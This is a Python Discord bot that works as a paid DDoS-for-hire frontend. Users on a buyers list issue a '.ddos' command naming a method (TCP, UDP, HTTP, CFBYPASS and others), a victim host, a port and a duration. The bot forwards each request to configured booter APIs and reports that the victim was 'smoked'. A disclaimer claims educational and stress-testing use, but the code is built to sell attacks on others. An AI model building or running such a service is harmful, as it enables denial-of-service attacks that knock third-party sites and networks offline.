# I may not be held responsible for any damage caused by my code. This project is purely made for 'Proof-Of-Concept', educational purposed,
# and stress-testing your own networks and IoT devices to test your DDoS protection. I do not tolerate any illegal use of my code,
# and the user is responsible for everything that he/she/they do with my code.
#
# This was created because a lot of script kiddies have been making poorly coded Discord DDoS bots, they used requests.get/post for Discord Bots, they used unclean code,
# they used poor grammar on the bots, and so on.
#
# With poor grammar, I refer to the people that say 'your' instead of 'you're', 'i' instead of 'I', 'dont' instead of 'don't', and so on.
# These little children should pay attention in school. Such grammar mistakes make you look more silly, and therefore you will archive less.
#
# This was made by XxBiancaXx#4356.
#
# LINKS:
# https://www.github.com/XxB1a/ddos-discord-bot
# https://www.instagram.com/moron420

from discord.ext import commands     # Commands
from discord.ext.commands import Bot # BOt
from os import system                # This will be used to clear the screen in on_ready()
from os import name                  # ^
from colorama import *               # This will be used to print our startup banner in color
import discord                       # D I S C O R D
import aiohttp                       # For our API Requests
import random                        # Random.randint(1,6) will be used in the random_color() function!

buyers  = [1, 2, 3]              # Replace digits with Discord USER-IDs!
admins  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (admins!!)
owners  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
token   = 'your_token_lol'                  # Discord Bot token
bot     = commands.Bot(command_prefix='.')
maxtime = 1200 # The max booting time for our bot. You need to change it, probably.

l4methods = ['TCP', 'UDP', 'STD']             # Our Layer4 methods. Add more if desired!
l7methods = ['HTTP', 'CFBYPASS', 'HTTP-NUKE'] # Our Layer7 methods. Add more if desired!

# This is a list of dirs. We will use this for multiple API keys in the DDoS command.
api_data = [
    {
        'api_url':'https://www.yahoo.com', # API URL #1
        'api_key':'KEYYYYYY',              # API KEY #1
    },
    {
        'api_url':'https://www.google.com', # API URL #1
        'api_key':'KEYYYYYY',               # API KEY #1
    }
]

# This is our function to give embeds a random color!
# You can call it using 'await random_color()'
async def random_color():
    number_lol = random.randint(1, 999999)

    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))

    return number_lol

@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')

#ctx, method/help, victim (ip/host), port (exmpl 80), time
@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers: # They didn't buy the bot!!
        await ctx.send('Sorry, but you need to buy a spot!')

    else:
        if method.upper() == 'HELP':
            l4methodstr = ''
            l7methodstr = ''

            for m in l4methods:
                l4methodstr = f'{l4methodstr}{m}\n'

            for m2 in l7methods:
                l7methodstr = f'{l7methodstr}{m2}\n'

            embed = discord.Embed(title="HELP", description="UwU you're lost", color=await random_color())
            embed.add_field(name="Syntax:", value=".ddos <method> <target> <port> <time>")
            embed.add_field(name="L4 METHODS:", value=f"{l4methodstr}")
            embed.add_field(name="L7 METHODS:", value=f"{l7methodstr}")

            await ctx.send(embed=embed)

        # There was no method
        elif method is None:
            await ctx.send('You need a method!')
            
        # The method was invalid!
        elif method.upper() not in l4methods and method.upper() not in l7methods:
            await ctx.send(f'Invalid method!!')

        # There was no victim
        elif victim is None:
            await ctx.send('You need a target!')

        # There was no port
        elif port is None:
            await ctx.send('You need a port!')

        # There was no time
        elif time is None:
            await ctx.send('You need a time!')

        # The time was bigger then allowed (maxtime)
        elif int(time) > maxtime:
            await ctx.send(f'Time {time} is bigger then the max time {maxtime}!!!')

        # Everything is correct!
        else:
            for i in api_data:
                try:
                    api_url = i["api_url"]
                    api_key = i["api_key"]

                    async with aiohttp.ClientSession() as session:
                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')
                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')

                except Exception as e:
                    #print(e)
                    pass

            embed = discord.Embed(title="Smoked!", description=f"UwU, you smoked {victim}", color=await random_color())
            await ctx.send(embed=embed)

@bot.event
async def on_ready():
    banner = f"""
        {Fore.RED};) ██╗  █{Fore.YELLOW}█╗███████{Fore.GREEN}╗███╗   █{Fore.CYAN}█╗███████{Fore.BLUE}█╗ █████╗{Fore.MAGENTA} ██╗ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║██╔════{Fore.GREEN}╝████╗  █{Fore.CYAN}█║╚══██╔═{Fore.BLUE}═╝██╔══██{Fore.MAGENTA}╗██║ :-).
        {Fore.RED};) ██████{Fore.YELLOW}█║█████╗ {Fore.GREEN} ██╔██╗ █{Fore.CYAN}█║   ██║ {Fore.BLUE}  ███████{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██╔══█{Fore.YELLOW}█║██╔══╝ {Fore.GREEN} ██║╚██╗█{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██╔══██{Fore.MAGENTA}║██║ :-).
        {Fore.RED};) ██║  █{Fore.YELLOW}█║███████{Fore.GREEN}╗██║ ╚███{Fore.CYAN}█║   ██║ {Fore.BLUE}  ██║  ██{Fore.MAGENTA} ██║ :-).
        {Fore.RED};) ╚═╝  ╚{Fore.YELLOW}═╝╚══════{Fore.GREEN}╝╚═╝  ╚══{Fore.CYAN}═╝   ╚═╝ {Fore.BLUE}  ╚═╝  ╚═{Fore.MAGENTA}╝╚═╝ :-).
        {Fore.RESET}"""

    if name == 'nt':
        system('cls')

    else:
        system('clear')

    print(banner)
    print(f'{Fore.RED}           Logged in on {Fore.YELLOW}{bot.user.name}{Fore.GREEN}! My ID is {Fore.BLUE}{bot.user.id}{Fore.MAGENTA}, I believe!{Fore.RESET}\n')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
        
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))

if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
